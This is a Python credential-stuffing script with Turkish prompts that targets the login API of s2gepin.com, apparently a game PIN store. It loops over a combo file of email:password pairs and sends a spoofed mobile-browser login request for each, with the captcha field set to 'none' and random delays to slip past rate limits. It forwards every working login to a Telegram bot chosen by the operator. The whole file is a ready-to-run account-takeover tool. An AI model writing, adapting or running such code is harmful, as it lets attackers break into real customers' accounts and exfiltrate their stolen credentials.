import requests
import time
import random
import json
import os
from cfonts import render

print("\n\n")
kopmk = render('en4rt', colors=['white', 'red'], align='center')
print(kopmk)
print("━" * 55) 

token = input(" - Token Gir: ")
id = input(" - İd Gir: ")
EnartCombo = input(" - Combo gir: ")
os.system('clear')

print("\n\n")
kopmk = render('en4rt', colors=['white', 'red'], align='center')
print(kopmk)
print("━" * 55)



headers = {
    'authority': 'api.s2gepin.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/json; charset=UTF-8',
    'h-country-code': 'TR',
    'h-region-code': 'TR',
    'origin': 'https://www.s2gepin.com',
    'referer': 'https://www.s2gepin.com/',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
}

with open(EnartCombo, 'r') as file:
    for line in file:
        try:
            mail, pas = line.strip().split(':')
            json_data = {
            'email': mail,
            'password': pas,
            'otpcode': None,
            'CaptchaToken': 'none',
            }
            response = requests.post('https://api.s2gepin.com/Login/Customer', headers=headers, json=json_data)
            
            try:
                json = response.json()
                if json.get('success') is True:
                    print(f"Başarılı giriş ✅ {mail}:{pas}")
                    mesaj = f"- S2gepin Başarılı Giriş -\n📧Mail: {mail}\n🔑Password: {pas}"
                    gonder = f"https://api.telegram.org/bot{token}/sendMessage"
                    msj = {
                    "chat_id": id,
                    "text": mesaj
                    }
                    requests.post(gonder, data=msj)
                    print("━" * 55) 
                else:
                    print(f"Başarısız giriş ❌ {mail}:{pas}")
                    print("━" * 55) 
                    
            except json.JSONDecodeError:
                print(f"Hata: {response.text}")

            time.sleep(random.uniform(12, 13))

        except Exception as e:
            print(f"Hata: {e}")
            


print(response.text)
